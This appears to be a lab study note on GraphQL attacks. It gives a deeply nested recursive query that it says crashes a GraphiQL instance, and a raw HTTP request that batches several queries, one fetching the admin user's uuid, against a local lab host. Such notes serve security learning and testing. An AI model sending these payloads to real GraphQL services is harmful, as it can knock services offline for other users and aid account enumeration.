## Denial-of-Service (DoS) Attacks

```url
https://graphql-kit.com/graphql-voyager/
```
![](Denial-of-Service%20(DoS)%20&%20Batching%20Attacks-20260914-141831.png)

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

![](Denial-of-Service%20(DoS)%20&%20Batching%20Attacks-20260914-142015.png)

Making our initial query large will significantly slow down the server, potentially causing availability issues for other users. For instance, the following query crashes the `GraphiQL` instance:

```graphql
{ posts { author { posts { edges { node { author { posts { edges { node { author { posts { edges { node { author { posts { edges { node { author { posts { edges { node { author { posts { edges { node { author { posts { edges { node { author { posts { edges { node { author { username } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } }
```

![](Denial-of-Service%20(DoS)%20&%20Batching%20Attacks-20260914-142048.png)
## Batching Attacks

```http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
    {
        "query":"{user(username: \"admin\") {uuid}}"
    },
    {
        "query":"{post(id: 1) {title}}"
    }
]
```

The response contains the requested information in the same structure we provided the query in:

![](Denial-of-Service%20(DoS)%20&%20Batching%20Attacks-20260914-142229.png)
